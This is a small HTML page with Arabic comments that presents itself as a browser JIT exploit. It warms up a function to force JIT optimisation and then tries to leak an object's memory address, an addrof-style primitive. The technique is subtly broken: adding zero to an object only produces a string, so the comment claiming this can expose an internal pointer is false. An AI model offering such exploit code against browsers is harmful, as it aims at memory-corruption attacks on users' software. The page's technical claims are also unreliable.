<!DOCTYPE html>
<html>
<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
    <div id="log">بدء العملية...</div>
<script>
    function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }
    
    // دالة "مسممة" تجبر الـ JIT على العمل
    function getAddress(o) {
        // هذه الحيلة تجبر المحرك على تحويل الكائن إلى قيمة أولية (Primitive)
        // مما يكشف أحياناً عن المؤشر الداخلي
        return o + 0; 
    }

    try {
        let obj = { a: 1 };
        log("بدء تهيئة الـ JIT...");
        
        // تشغيل الدالة عدة مرات لجعل المحرك يقوم بـ JIT Optimization
        for(let i = 0; i < 10000; i++) { getAddress(0.1); }
        
        // الآن نحاول تسريب عنوان الكائن
        let addr = getAddress(obj);
        log("العنوان الذي تم تسريبه عبر الـ JIT: " + addr.toString(16));
        
    } catch(e) {
        log("خطأ: " + e.message);
    }
</script>



</body>
</html>
